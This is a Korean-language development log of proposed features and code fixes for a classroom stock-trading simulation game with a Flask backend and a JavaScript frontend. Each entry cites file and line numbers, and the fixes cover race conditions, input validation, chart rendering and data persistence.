- **`get_history()` "1년" 탭이 "1달"과 동일하게 30개 바만 생성** (`stock_service.py:292`, `n_bars` 딕셔너리): `n_bars = {'1d': 30, '5d': 5, '1mo': 30, '3mo': 90}.get(period, 30)` — `'1y'` 키가 없어 기본값 30으로 처리됨. "1년" 탭 차트와 "1달" 차트가 동일한 모양으로 나타나 교육적 의미가 없음. `'1y': 252`(연간 영업일 수)를 딕셔너리에 추가하고, 각 기간에 맞는 날짜 간격도 `interval_days = {'1d': 0.167, '5d': 1, '1mo': 1, '3mo': 1, '1y': 1}.get(period, 1)` 로 정의해 `now - i * 86400 * interval_days` 로 각 바의 타임스탬프를 계산하면 됨. stock_service.py:292·297 두 줄 수정.

- **관심종목(watchlist)이 방 구분 없이 전역 localStorage에 저장됨** (`app.js:17`, `S.watchlist`, `app.js:1283-1284`): `localStorage.getItem('watchlist')` 키가 방 ID 없이 저장되어 학기 중 여러 게임에 참여하는 학생의 관심종목이 계속 누적되고, 다른 반 학생이 같은 브라우저를 쓸 경우 관심종목이 공유됨. 방별 독립 저장: `app.js:17`의 키를 `'watchlist'`에서 `'watchlist_' + roomId`로 변경하고, `enterParticipantGame()` 진입 시(app.js:589) 현재 `S.room.id`로 watchlist를 로드하면 됨. `toggleWatchlist()` 저장 시(app.js:1283)도 동일 키 사용. 서버 변경 불필요, 3곳 1줄씩 수정.

- **진행자 랭킹·Excel에서 학번/이름 서버측 분리 제공** (`app.py:548-561`, `host_members()`, `app.py:1435-1438`): 현재 `host_members()` 응답의 `username` 필드가 `"20715 홍길동"` 합성 문자열. 클라이언트 `loadHostMembers()`(app.js:412)가 이를 통째로 표시해 가독성이 낮고, 이름만 크게 표시하기 어려움. `host_members()` 응답 딕셔너리에서 `export_rankings()`(app.py:1435)와 동일한 로직(`parts = u.username.split(' ', 1)`)으로 `student_id`·`name` 필드를 미리 분리해 반환하면, 클라이언트에서 이름만 굵게 표시하고 학번을 부제로 표시하는 레이아웃 구현 가능. 진행자가 학생 이름을 빠르게 스캔하는 수업 중 실용성 향상.

### 제거/단순화할 것들

- **`confirmLeaveGame()` 브라우저 기본 `confirm()` 사용 — 모바일 실수 퇴장 위험** (`app.js:114-117`): UI 전체가 CSS 모달(`openModal()`/`closeModal()`)을 사용하는데 게임 이탈 확인만 `window.confirm()`. 모바일에서 dismiss 제스처(스와이프)로 `false` 반환되면 `goHome()`(app.js:108)이 즉시 `POST /api/auth/logout`을 호출해 세션이 파기됨. 재입장 시 `resumeRoom()`이 호출되지 않아 방 상태를 잃는 것으로 학생이 오인. 기존 `modal-rules` 구조처럼 별도 이탈 확인 모달을 추가하고, 모달 안에 "현재 순위와 보유 자산은 유지됩니다. 재입장 시 동일 코드로 복귀 가능합니다." 안내를 포함하면 실수 이탈과 불안감 해소 동시에 달성.

- **`_quiz_state` 구조가 `{(rid, uid): state}` 평면 딕셔너리 — 방 종료 정리가 O(N) 순회** (`app.py:1245`, `app.py:159-160`): `_end_room()` 내 정리 코드 `for k in [k for k in _quiz_state if k[0] == room.id]: del _quiz_state[k]`가 딕셔너리 전체를 순회. 동일 파일의 `_lots`, `_rlt_active`, `_quiz_settings`, `_roulette_config`는 모두 `_lots.pop(room.id, None)` 패턴으로 O(1) 정리(app.py:155-157). `_quiz_state` 구조를 `{(rid, uid): state}` → `{rid: {uid: state}}`로 변경하면 `_quiz_state.pop(room.id, None)` 한 줄로 통일 가능. `get_quiz()`(app.py:1255), `submit_quiz()`(app.py:1271·1340) 참조도 `_quiz_state.setdefault(rid, {})[user.id]` 형태로 수정(총 ~6곳).

- **`RoomTransaction.action` VARCHAR(4) 제한으로 복권·퀴즈 액션 우회 저장** (`models.py:74`, `app.py:218`, `app.py:1316`): `action = db.Column(db.String(4))`로 4자 제한. 현재 복권 당첨금은 `action='ADJ', symbol='LOTTO'`(app.py:218), 퀴즈 패널티 주식 청산도 `action='SELL', note='퀴즈 오답 패널티'`(app.py:1316)로 우회. 거래 내역 탭에서 `t.action === 'ADJ'`이면 "조정"(app.js:529)으로 표시되어 복권 당첨과 진행자 자산 조정이 같은 레이블로 묶임. 컬럼을 `db.String(10)`으로 확장하고(`LOTTO`, `QUIZ`, `BONUS` 등 명시적 액션 도입) 거래 내역 표시 로직(app.js:529)도 액션별로 구분하면 학생이 "왜 자산이 변했는지" 한눈에 파악 가능. SQLite는 VARCHAR 크기를 강제하지 않아 즉각 오류 없지만 PostgreSQL 전환 시 잘림 위험.

- **`get_history()` 모든 바의 시가(open)가 전 바 종가(close)와 항상 동일 — 갭 없는 차트** (`stock_service.py:298-303`): `o = price` → `c = max(1.0, o * (1 + gauss))` → `price = c` 패턴에서 다음 바의 `o`가 항상 직전 `c`와 동일. 실제 주식 차트에는 전날 종가와 당일 시가 사이 갭(gap)이 발생해 "갭 상승", "갭 하락" 개념을 시각적으로 교육할 수 있는데, 현재 구현에서는 항상 연속 캔들. `o = price * random.uniform(0.99, 1.01)` 한 줄로 바꾸면 현실적인 갭이 생성되어 "아침 시초가가 왜 어제 종가와 다른가?" 수업 소재로 활용 가능. stock_service.py:298 수정 1줄.

- **결과 화면 `host-bar-chart` / `results-bar-chart`가 고정 높이로 30명 이상 시 바 너무 얇아짐** (`index.html:157`, `index.html:625-627`, `app.js:433-478`): `<canvas id="host-bar-chart" style="max-height:300px">` 와 `results-chart-wrap style="height:220px"` 가 고정 높이. Chart.js 가로 막대 차트(`indexAxis:'y'`)에서 참여자 30명이면 바 높이가 6px 이하로 레이블이 잘림. `max-height` 대신 `min(600px, max(240px, memberCount * 28px))` 를 동적으로 계산해 canvas 컨테이너 높이를 설정하면(`renderHostBarChart()` 호출 전 `canvas.parentElement.style.height` 업데이트) 인원수에 상관없이 읽기 편한 차트 생성. 엑셀보다 이 차트가 수업 중 실시간 발표용으로 더 많이 활용되므로 가독성 직결.

---

## 2026-07-24 (2차)

### 추가하면 좋을 기능

- **종목 이름 텍스트 검색 필터** (`app.js:1261-1284`, `filterStocks()`, `index.html` 섹터 필터 영역): 현재 시장 탭에서 45종목을 섹터 버튼으로만 필터링할 수 있어, 학생이 "TSLA"나 "삼성SDI"를 바로 찾으려면 섹터를 알아야 함. 섹터 버튼 행 위에 `<input type="search" id="stock-search" placeholder="종목 검색…" oninput="filterStocks()">` 하나를 추가하고, `filterStocks()`(`app.js:1261`)에 `const q = document.getElementById('stock-search')?.value.toLowerCase() || ''` 를 추가해 `st.name.toLowerCase().includes(q) || st.symbol.toLowerCase().includes(q)` 조건을 기존 섹터 필터와 AND 결합하면 됨. 서버 변경 불필요, 클라이언트 ~6줄 추가. 종목 수가 많을수록 유용.

- **게임 룸 재시작(리셋) 기능 — 같은 코드·설정으로 2교시 연속 수업** (`app.py:519-537`, `end_room()`, `app.py:363-390`, `create_room()`): 현재 게임 종료 후 같은 반 2교시 수업을 위해 진행자가 새 방을 만들어야 하고, 학생들은 새 코드로 재입장해야 함. `POST /api/rooms/<rid>/reset` 엔드포인트를 추가해 `room.status = 'waiting'`, `room.end_time = None`, `room.start_time = None` 으로 초기화하고, `RoomMember.cash`를 `room.starting_cash`로 일괄 리셋하며, `RoomHolding`·`Deposit`·`RoomTransaction` 레코드를 삭제하면 같은 방 코드와 QR 코드를 재사용 가능. `_end_room()` 내 in-memory 정리 로직(`app.py:155-162`)을 함수로 추출해 재사용. 교실에서 여러 반을 연속 진행하는 교사에게 직접적으로 유용.

- **진행자 수업 연계 이벤트 프리셋 버튼** (`app.py:1345-1360`, `host_market_event()`, `index.html` 호스트 시장 탭): 현재 `host_market_event()`는 섹터와 변동률을 자유 입력. 교사가 수업 중 실시간으로 경제 이벤트를 연출하려면 섹터명과 %를 타이핑해야 해 수업 흐름이 끊김. `index.html`의 시장 이벤트 패널에 미리 정의된 버튼 그룹 "📈 금리 인하 → 금융·배터리 +5%", "📉 무역전쟁 → 해외IT·해외반도체 −8%", "⚡ 반도체 호황 → 반도체 +10%" 등 5~6개를 추가하고, 각 버튼 `onclick`에서 `api.post('.../host/market-event', {sector:'금융', pct:5})` 를 직접 호출하면 됨. 기존 엔드포인트 재사용이므로 서버 변경 불필요, 클라이언트 HTML ~30줄.

- **학생 개인 거래 내역 Excel 다운로드** (`app.py:829-847`, `get_transactions()`, `app.py:1419-1488`, `export_rankings()`): 현재 진행자만 순위 Excel을 내려받을 수 있음. 학생 자신의 거래 내역을 `GET /api/rooms/<rid>/export/my-transactions` 로 다운로드하면 "내가 언제 어떤 종목을 얼마에 샀고 얼마에 팔았는지"를 스프레드시트로 분석 가능. 기존 `export_rankings()` 의 openpyxl 스타일 코드를 참고해, `RoomTransaction.query.filter_by(room_id=rid, user_id=user.id).order_by(timestamp)` 결과를 행으로 쓰면 됨. 서버 ~50줄 추가(기존 엑셀 스타일 재사용), 클라이언트 "내 거래 내역 다운로드" 버튼 1개. 수업 후 "내 투자 회고"에 활용 가능.

- **예금 이자 실시간 누적 표시(예금 탭 자동 갱신)** (`app.js:1621-1643`, `loadDepositsPage()`, `app.js:613-650`, 참여자 폴링 루프): `loadDepositsPage()` 는 탭 진입 시 1회만 실행되어 `expected_interest` 가 고정됨. 서버의 `get_deposits()` 는 현재 시각 기준으로 실시간 `expected_interest` 를 계산해 반환하므로(`app.py:863-867`) 폴링 시 재조회하면 갱신됨. 참여자 폴링 루프(app.js:613)에 `if (S.currentPage === 'deposits') loadDepositsPage()` 를 추가하면 10초마다 이자가 자동 갱신. 학생이 "시간이 지날수록 이자가 쌓인다"를 실시간으로 목격해 복리·시간가치 개념 교육 효과 즉각 향상.

- **진행자 호스트 화면에서 게임 중 선택적 종목 활성화/비활성화 설정** (`app.py:651-671`, `get_stocks()`, `stock_service.py:STOCKS`): 현재 45종목이 항상 전체 노출. 수업 주제가 "국내 반도체 기업 비교"라면 SMSNG·SKHYN·SMSEL만 보이도록 제한하고 싶어도 방법이 없음. `Room` 테이블에 `active_symbols = db.Column(db.Text, default='')` 컬럼을 추가하고, `POST /api/rooms/<rid>/host/active-symbols` 엔드포인트로 콤마 구분 심볼 목록을 저장. `get_stocks()`(`app.py:657`) 에서 `active = set(room.active_symbols.split(',')) if room.active_symbols else None` 로 필터링하면 됨. 진행자 설정 화면(`index.html` 호스트 탭)에 체크박스 그리드 추가. 수업 목적에 맞는 종목만 노출해 학생 집중도 향상.

### 제거/단순화할 것들

- **`api.get()` / `api.post()` HTTP 에러 응답 시 서버 에러 메시지 버림** (`app.js:30-32`, `app.js:36-37`): `if (!r.ok) return {error: \`HTTP ${r.status}\`}` 가 응답 바디를 읽지 않고 반환. 서버가 `400 {"error": "잔액 부족 — 필요: 50,000원 / 보유: 30,000원"}` 을 보내도 클라이언트는 "HTTP 400"만 표시. `execTrade()` 오류 팝업(`app.js:1435`), `doJoinRoom()` 에러 메시지(`app.js:155`), `doDeposit()` 에러(`app.js:1652`) 등 모든 에러 경로에서 실제 사유가 사라짐. `if (!r.ok) { try { return await r.json(); } catch(_) { return {error: \`HTTP ${r.status}\`}; } }` 로 교체하면 서버 한국어 메시지 정상 전달. 2줄 수정.

- **`get_room()` 함수 내 `cur_user()` DB 조회 최대 4번 중복 실행** (`app.py:439,444,465,473`): `get_room()` 은 얼리 리턴 경로(자동 종료 분기 439, 444줄, 룰렛 트리거 분기 465줄)와 최종 리턴(473줄)에서 각각 독립적으로 `cur_user()`를 호출. 모든 경로에서 `db.session.get(User, session['user_id'])` 가 1회 이상 실행됨. 함수 상단에 `user = cur_user()` 한 번 호출 후 `user.id`를 재사용하면 DB 쿼리 최대 3회 절감. 10초마다 모든 참여자가 이 엔드포인트를 호출하므로 누적 효과가 큼.

- **`withdraw_deposit()` 에서 `RoomMember` null check 누락 → AttributeError 위험** (`app.py:912-914`): `m = RoomMember.query.filter_by(room_id=rid, user_id=user.id).first()` 이후 `if not m:` 없이 바로 `m.cash += dep.amount` 실행. DB 정합성 이상이나 이미 강퇴된 멤버가 예금 해지를 시도하면 `AttributeError: 'NoneType' object has no attribute 'cash'` → 500 오류로 예금 해지가 무응답 처리됨. `create_deposit()`(`app.py:885-886`) 와 동일한 패턴으로 `if not m: return jsonify({'error': '참여자가 아닙니다.'}), 403` 을 `m = ...` 직후에 추가하면 방어 완료.

- **`_end_room()` 동시 다중 호출 방지 Lock 없음 — 이중 자산 정산 위험** (`app.py:120-163`): 타이머 만료(`get_room()` 내 자동 종료, app.py:438)와 호스트의 수동 종료 요청(`end_room()`, app.py:519)이 밀리초 단위로 겹치면 두 스레드가 동시에 `room.status == 'active'`를 확인하고 `_end_room()`에 진입 가능. 내부에서 동일한 `RoomHolding`을 두 번 청산하면 현금이 이중 지급됨. 간단한 해결책: `_end_room()` 최상단에서 `room.status`를 `'ended'`로 먼저 커밋(`db.session.flush()`) 후 나머지 처리를 진행하면, 두 번째 호출이 `room.status == 'active'` 조건을 통과하지 못해 방어됨. 혹은 별도 `_end_lock = threading.Lock()` 을 도입.

- **`lottery_pick()` 에서 `_lottery_lock` 없이 `cur['picks']` 딕셔너리 변경** (`app.py:1170`): `cur['picks'][str(user.id)] = nums` 가 `_lottery_lock` 외부에서 실행. 같은 딕셔너리를 `get_lottery()`(`app.py:1123`) 가 Lock 내부에서 `_do_reveal()` 안에서도 읽음. CPython GIL이 단일 딕셔너리 item 쓰기를 원자적으로 보호하지만, `cur['picks']` 변경 직후 바로 아래(app.py:1174-1181)에서 Lock 없이 `len(cur['picks'])` 를 읽어 `drawing` 전환 조건을 평가하므로, 복수 사용자가 동시에 마지막 번호를 제출할 때 race가 발생해 `cur['state']` 전환이 두 번 시도될 수 있음. `cur['picks'][str(user.id)] = nums` 부터 전이 체크까지 전체를 `with _lottery_lock:` 블록으로 감싸는 것이 올바른 수정.

- **`loadPortfolio()` 진입마다 Chart.js destroy+create 반복 — 깜빡임 및 메모리 부담** (`app.js:1486`, `app.js:1509`): 포트폴리오 탭을 클릭할 때마다 `if (S.portChart) S.portChart.destroy()` / `S.portChart = new Chart(...)` 와 `if (S.assetLineChart) S.assetLineChart.destroy()` / `S.assetLineChart = new Chart(...)` 가 실행. DOM 노드 재계산과 Canvas 재렌더링 비용이 발생하며, 순간적인 흰 깜빡임이 생김. `renderHostBarChart()`(`app.js:300-337`)에서 이미 `chart.data.datasets[0].data = values; chart.update()` 패턴을 사용하므로, 동일하게 기존 인스턴스가 있으면 데이터만 갱신하는 방식으로 교체하면 됨. 도넛과 라인 차트 각각 5줄 수정.

- **`_end_room()` 내 `Room` 객체를 `_do_reveal()` 에서 두 번 조회** (`app.py:226-233`): `_do_reveal()` 내부에서 `_room_lot = db.session.get(Room, rid)` (226줄)로 Room을 조회한 후, 곧바로 auto-paused 처리에서 `room = db.session.get(Room, rid) if _room_lot is None else _room_lot` (233줄)로 같은 레코드를 또 참조. `_room_lot`이 None인 경우에만 재조회하는 의도지만, 루프 전 단계에서 이미 `_room_lot`을 가져왔으므로 233줄의 조건부 재조회는 불필요. `room = _room_lot` 으로 단순화하면 조건부 쿼리 1건 제거. 더 나아가 호출자(`_auto_start_lottery_if_due`, `lottery_draw`)가 이미 Room 객체를 보유하므로 `_do_reveal(rid, cur, room=None)` 시그니처로 room 인자를 받아 전달하면 DB 조회를 완전히 제거 가능.

---

## 2026-07-25

### 추가하면 좋을 기능

- **퀴즈 FAB에 쿨다운 타이머 표시** (`app.js` 퀴즈 FAB 렌더, `app.py:1256-1259`): 퀴즈 제출 후 60초 쿨다운이 있으나 FAB(`<button class="quiz-fab">`)은 항상 "🧠 퀴즈" 텍스트로 고정되어 있어, 학생이 쿨다운 중인지 알려면 FAB을 눌러 모달을 열어야 함. `get_quiz()`가 `cooldown` 값을 반환하므로, 폴링 주기마다 잔여 쿨다운을 FAB 텍스트에 반영(`🧠 퀴즈 (42s)`)하면 불필요한 모달 열기를 줄이고 참여 리듬을 개선할 수 있음. 구현: `loadRankings()` 또는 별도 `updateQuizFab()` 함수에서 `GET /api/rooms/${rid}/quiz` 결과 재활용.

- **게임 중 학생 강퇴(kick) 기능** (`app.py:564-575`, `kick_member()`): `kick_member()`가 `room.status != 'waiting'`일 때 400을 반환해 게임 시작 후 잘못 입장한 학생을 제거할 수단이 없음. `waiting` 전용 제약을 제거하고, 게임 중 강퇴 시 해당 멤버의 보유 주식을 현재가로 정산(현금화)한 뒤 `RoomMember`를 삭제하는 로직을 추가하면 됨. `_end_room()`의 주식 정산 로직(`app.py:144-152`)을 별도 함수로 추출해 재사용.

- **복권 당첨 결과 진행자 모달에 시각적 강조** (`app.py:1141-1147`, `get_lottery()`, 진행자 복권 모달): 복권 `revealed` 상태에서 `all_results`가 반환되지만, 진행자 호스트 모달(`#modal-lottery-result`)에는 당첨자가 단순 텍스트로만 표시됨. 6개 일치 잭팟이 발생하면 confetti(`#confetti-canvas` 기존 캔버스 재사용)를 발사하고 당첨자 이름을 큰 폰트로 강조하면 수업 하이라이트로 활용 가능. 서버 변경 없이 `app.js`의 `closeLotteryResultModal()`/결과 렌더 부분 수정만으로 구현 가능.

- **자산 히스토리 스냅샷 서버 저장** (`app.js:S.assetHistory`, `app.py`): 학생 포트폴리오의 "자산 변화" 꺾은선 차트(`#asset-line-chart`)가 `S.assetHistory` 클라이언트 배열에만 의존해, 페이지 새로고침 시 데이터가 사라짐. `app.py`에 `GET /api/rooms/<rid>/asset-history` 엔드포인트를 추가하고, `loadPortfolio()` 호출 시마다 현재 `total_value`를 서버에 기록(`RoomTransaction` 테이블의 `action='SNAP'` 레코드 활용 또는 별도 경량 테이블)하면 새로고침 후에도 차트가 유지됨. Render 슬립 재기동 시 복구도 가능.

- **진행자용 학생 포트폴리오 열람** (`app.py:542-561`, `host_members()`): 진행자는 학생의 총 자산·수익률·거래 내역만 볼 수 있고 현재 보유 종목 구성을 알 수 없음. `app.py:605` 에 이미 있는 `host_member_transactions()` 패턴처럼 `GET /api/rooms/<rid>/host/members/<uid>/portfolio`를 추가하고, `host-members-list`의 각 학생 행에 "포트폴리오" 버튼을 붙이면 "왜 이 수익률이 나왔는지" 즉각적인 교육 개입이 가능. `get_portfolio()` 로직(`app.py:772-803`)을 공통 함수로 추출해 재사용.

- **종목 모달에 보유 평단가 대비 손익 표시** (`app.js` `openStockModal()` 근방): 현재 주식 모달에는 장중 `change_pct`(시가 대비)만 표시됨. `S.portfolio.holdings`에서 이미 `avg_price`, `gain_pct`를 받아오므로, 보유 종목인 경우 모달 헤더에 "내 수익: +5.2% (+120,000원)"을 한 줄 추가하면 매도 타이밍 판단에 직접적 도움이 됨. 서버 변경 없이 프론트 10줄 수정으로 구현 가능.

### 제거/단순화할 것들

- **`Room.query.get_or_404(rid)` — SQLAlchemy 2.0 deprecated API 다수 잔존** (`app.py:435,475,490,503,519,544,564,580,587,609,630,651,673,691,724,729` 등 20여 곳): `Query.get_or_404()`는 Flask-SQLAlchemy 3.x / SQLAlchemy 2.0에서 레거시 경로로, `db.session.get(Room, rid)` + 수동 404 처리로 교체해야 장기적으로 안전함. 한꺼번에 교체하기 어려우면 helper `def get_or_404(model, pk): obj = db.session.get(model, pk); abort(404) if not obj else obj` 를 두고 호출부만 변경해도 됨.

- **룰렛 자동일시정지 후 미참여 학생이 모달을 닫지 않으면 게임 무한 대기** (`app.py:965-993`, `minigame_close()`): `_rlt_active[rid]['count']`가 0이 될 때까지 게임이 재개되지 않는데, 학생이 창을 닫거나 네트워크가 끊기면 `close` API가 호출되지 않아 영구 대기가 발생할 수 있음. `minigame_open()`에 타임스탬프를 기록하고, `get_room()` 폴링 시 열린 지 5분 이상 경과한 룰렛을 자동 강제 종료하는 fallback을 추가하면 안전함.

- **`submit_quiz()` 응답에서 `explanation`만 반환 — 정답이 무엇인지 미노출** (`app.py:1342`): `return jsonify({'correct': correct, 'reward': reward, 'penalty': penalty, 'explanation': q['ex']})` 에서 정답(`q['a']`)이 빠져 있음. 학생이 오답 후 어떤 답이 맞는지 모달에서 알 수 없음. 응답에 `'answer': q['a']`를 추가하고 클라이언트에서 퀴즈 결과 div에 "정답: O" 또는 "정답: X"를 표시하면 교육 효과가 높아짐. 보안 리스크 없음(이미 답을 제출한 이후).

- **`get_stocks()` 섹터 필터가 서버사이드에서 전체 STOCKS 순회** (`app.py:658-671`): `?sector=반도체` 파라미터가 있어도 `for sym, info in STOCKS.items()`로 전체 47개 종목을 순회 후 파이썬 레벨에서 필터링. STOCKS가 고정 딕셔너리이므로 섹터별 인덱스(`STOCKS_BY_SECTOR = defaultdict(list)`)를 모듈 로드 시 1회 빌드해두면 초기화 비용 없이 O(n) → O(k)로 줄일 수 있음(n=종목 수, k=해당 섹터 종목 수). `stock_service.py:99` 아래에 `STOCKS_BY_SECTOR` dict 추가, `app.py:659`에서 `STOCKS_BY_SECTOR.get(sf, STOCKS)` 사용.

- **`loadLobbyMembers()` 폴링이 게임 시작 후에도 계속 실행** (`app.js:192`): `enterHostLobby()`에서 `S.pollInterval = setInterval(loadLobbyMembers, 5000)`을 설정한 후, `doStartGame()`의 `stopPolling()`(`app.js:254`)이 올바르게 정리하긴 하지만, `stopPolling()` 호출 전에 `enterHostGame()`이 새 interval을 덮어쓸 경우 기존 로비 폴링이 남을 수 있음. `enterHostLobby()` 상단에서 항상 `stopPolling()` 선호 호출로 보험 처리하고, 단일 `S.pollInterval` 변수에 interval 하나만 살아있도록 보장하면 안전함.

---

## 2026-07-25 (2차)

### 추가하면 좋을 기능

- **게임 종료 후 개인 투자 종합 리포트** (`app.py:829-847`, `get_transactions()`, `app.py:1419-1488`, `export_rankings()`): 결과 화면(`screen-results`)에 학생 개인의 "투자 요약" 섹션을 추가. `RoomTransaction.query.filter_by(room_id=rid, user_id=uid)` 집계로 가장 많이 거래한 종목, 단일 종목 최대 수익/손실, 총 거래 횟수 등을 서버측 `GET /api/rooms/<rid>/my-report` 엔드포인트로 반환. 결과 화면 `loadResults()`(app.js:1702) 안에서 호출해 "나는 어느 종목에서 가장 잘 했나?" 성찰용으로 활용. 서버 ~20줄, 클라이언트 결과 화면 섹션 1개 추가.

- **참여자 게임 화면 상단에 방 코드 배지 상시 표시** (`app.js:589-651`, `enterParticipantGame()`, `index.html` 참여자 게임 상단 바): 학생이 게임 중 브라우저를 닫거나 새로고침하면 방 코드를 몰라 재입장이 어려움. `enterParticipantGame()` 진입 시(app.js:598) `S.room.code`를 상단 툴바(또는 화면 고정 영역)에 소형 배지(`<span id="game-room-code">`)로 표시하면 됨. 탭하면 클립보드 복사 기능 겸용. 서버 변경 불필요, HTML·JS ~5줄.

- **진행자 랜딩 화면에 종료된 방 목록 및 결과 재열람** (`app.py:307-313`, `find_active_room()`, `app.py:808-824`, `get_rankings()`): `find_active_room()` 이 `'ended'` 방을 반환하지 않아 게임 종료 후 진행자도 결과를 다시 볼 방법이 없음. `GET /api/rooms/history` 엔드포인트를 추가해 `Room.query.filter_by(host_id=user.id, status='ended').order_by(Room.created_at.desc()).limit(5)` 를 반환하고, 랜딩 화면에 "최근 게임 기록" 목록을 렌더링. 항목 클릭 시 `get_rankings()` 호출로 과거 결과 화면 재표시. 서버 ~15줄, 클라이언트 랜딩 화면 섹션 1개.

- **복권 픽킹 단계에서 진행자 실시간 참여 현황 확인** (`app.py:1114-1147`, `get_lottery()`, 진행자 복권 모달): `get_lottery()` 응답이 `picking` 상태에서 진행자에게 `len(cur['picks'])` 를 제공하지 않아 "지금 몇 명이 번호를 골랐는지" 알 수 없음. 응답에 `picks_submitted: len(cur.get('picks', {}))` 와 `eligible_count: RoomMember.query.filter_by(room_id=rid).count() - (1 if host_is_member else 0)` 를 추가하면 진행자가 "12/20명 선택 완료" 현황을 파악해 다음 단계로 넘어가는 타이밍을 잡을 수 있음. 서버 2줄, 클라이언트 모달에 진행 바 1개.

- **랭킹 화면 순위 변동 애니메이션** (`app.js:1673-1692`, `loadParticipantRankings()`): `loadParticipantRankings()` 가 10초마다 `list.innerHTML = ...`로 전체 DOM을 재생성해 랭킹 탭이 열려 있을 때 시각적 깜빡임 발생. 각 `.rank-row`에 `data-uid` 속성을 부여하고 기존 노드를 DOM에서 재배치(`insertBefore`)하는 방식으로 교체하면, 순위가 오를 때 `slide-up` CSS 애니메이션, 내려갈 때 `slide-down` 애니메이션을 자연스럽게 적용 가능. 수업 중 랭킹 변동이 눈에 띄어 학생 집중도 향상. 서버 변경 불필요.

- **게임 상단 헤더에 현재 보유 현금 잔액 실시간 표시** (`app.js:735-753`, `refreshMyRank()`, `app.py:819`, `get_rankings()`): `refreshMyRank()` 가 `me.total_value`와 `me.gain_pct` 는 표시하지만 `me.cash` 는 업데이트하지 않음. 현재 현금은 거래·예금 직후에만 `S.tradeCash` 에 갱신되고 10초 폴링으로는 반영이 안 됨. `get_rankings()` 응답(app.py:819)에 `cash` 필드를 추가하고, `refreshMyRank()` 에서 `document.getElementById('pg-cash-detail').textContent = krw(me.cash)` 로 매 10초마다 갱신하면 됨. 서버 1줄, 클라이언트 2줄.

### 제거/단순화할 것들

- **`get_room_service()` Lock 내부에서 `StockService()` 인스턴스 생성 — 다른 방 조회 블로킹** (`stock_service.py:318-322`): `with _room_services_lock: _room_services[room_id] = StockService()` — `StockService.__init__()`이 47종목 × `random.uniform()` + 타임스탬프 저장 연산을 수행하며 수 밀리초 소요. Lock 점유 중에 다른 방의 `get_room_service()` 호출이 모두 블로킹됨. 해결: Lock 외부에서 `svc = StockService()`를 먼저 생성 후 `with _room_services_lock: if room_id not in _room_services: _room_services[room_id] = svc` 패턴으로 변경하면 Lock 점유 시간이 O(1) dict 쓰기로 단축. 멀티 클래스 동시 시작 시나리오에서 효과적.

- **`force_price()` / `force_sector_event()` 내 `time.time()` 이중 호출 — news timestamp와 last_news_ts 미세 불일치** (`stock_service.py:235,240`, `stock_service.py:272,275`): 두 함수 모두 `self._news = {'timestamp': time.time(), ...}` 이후 별도로 `self._last_news_ts = time.time()` 를 호출. 극미한 시간차로 `_last_news_ts > _news['timestamp']` 가 되어 `_maybe_generate_news()` 의 TTL 계산 기준이 뒤틀림. `ts = time.time()` 한 번 할당 후 두 곳에서 `ts` 를 재사용하면 일관성 확보. `force_price()` 와 `force_sector_event()` 각 2줄 수정.

- **`get_history()` 기간별 봉 간격이 항상 24시간 고정 — 단기 차트가 날짜 단위로만 표시** (`stock_service.py:292-303`): `for i in range(n_bars, 0, -1): date_str = datetime.utcfromtimestamp(now - i * 86400)` — `86400` 초(24시간)가 모든 기간에 동일하게 사용. `'1d'` 탭은 5분 간격(288바), `'5d'` 는 30분 간격(~80바)이어야 기간별 시간 해상도가 의미 있는데 현재는 모두 1일 단위. `interval_secs = {'1d': 300, '5d': 1800, '1mo': 86400, '3mo': 86400, '1y': 604800}.get(period, 86400)` 을 정의하고 `now - i * interval_secs` 로 변경하면 됨. `date_str` 포맷도 `'%H:%M'`(단기) / `'%Y-%m-%d'`(장기)로 기간에 맞게 조정 필요. stock_service.py 약 5줄 수정.

- **`create_deposit()` 소수점 금액 허용 — float 오차 누적 및 비현실적 소액 예금** (`app.py:887-889`): `amount = float((request.json or {}).get('amount', 0))` 로 `0.1` 같은 소수점 금액이 허용됨. `m.cash -= 0.1` 반복 시 IEEE 754 부동소수점 오차가 쌓여 `0.1 + 0.1 + 0.1 != 0.3` 류 잔액 불일치 발생. 교실 환경에서 최소 입금 단위를 10,000원으로 강제하면 현실감도 높아짐. `amount = int(round(amount))` 변환 후 `if amount < 10000: return jsonify({'error': '최소 예금액은 10,000원입니다.'}), 400` 추가. `doDeposit()` 클라이언트(app.js:1647)에서도 동일 제한 UI 추가.

- **`_quiz_state` seen 집합이 in-memory 전용 — 서버 재시작 후 모든 학생에게 중복 문제 재출제** (`app.py:1260-1267`): `_lots[rid]` 은 `lottery_rounds_done` DB 컬럼으로 복구하고, `_rlt_active[rid]` 는 `rlt_triggered` 플래그로 복구하는데(app.py:467-468), `_quiz_state` 의 `seen` 집합은 복구 로직이 전혀 없음. Render free tier에서 슬립→재기동 후 학생들이 이미 푼 문제를 다시 받는 문제 발생. 퀴즈 제출 시 `RoomTransaction`에 `action='QUIZ', symbol='QUIZ_' + str(q['id'])` 로 quiz ID를 기록하고, 재시작 시 해당 트랜잭션에서 `seen = {int(t.symbol.split('_')[1]) for t in ...}` 로 복구하면 됨. `submit_quiz()` 트랜잭션 기록 로직(app.py:1339) 수정 포함.

- **`host_adjust()` delta 절대값 상한선 없음 — 실수 입력으로 게임 파괴 가능** (`app.py:595-603`): `math.isfinite(delta)` 검증(기 지적)이 있어도 `delta = 1_000_000_000_000`(1조) 같은 극단적 유한수는 통과. 진행자가 UI에서 실수로 `0`을 여러 개 입력하면 학생 자산이 비현실적으로 증가해 게임이 망가짐. `room.starting_cash` 기준 합리적 상한 `if abs(delta) > room.starting_cash * 5: return jsonify({'error': '조정 한도 초과'}), 400` 을 추가하면 실수 입력을 방어 가능. `delta = round(delta)` 로 정수화도 함께 적용.

---

## 2026-07-26

### 추가하면 좋을 기능

- **QR 스캔 후 방 코드 자동 주입** (`app.js:196-206`, `index.html:319-337`): `_makeQR()`이 생성하는 URL은 `?code=XXXXXX` 형태이지만(`app.js:197`), 페이지 로드 시 `URLSearchParams`로 해당 파라미터를 읽어 `join-code` 입력 필드에 자동 채우는 코드가 없음. `doJoinRoom()` 상단 혹은 `DOMContentLoaded` 핸들러에 `const c = new URLSearchParams(location.search).get('code'); if (c) { showScreen('screen-join'); document.getElementById('join-code').value = c.toUpperCase(); }` 3줄 추가면 됨. 학생이 QR 스캔 후 코드를 다시 타이핑하는 마찰 제거.

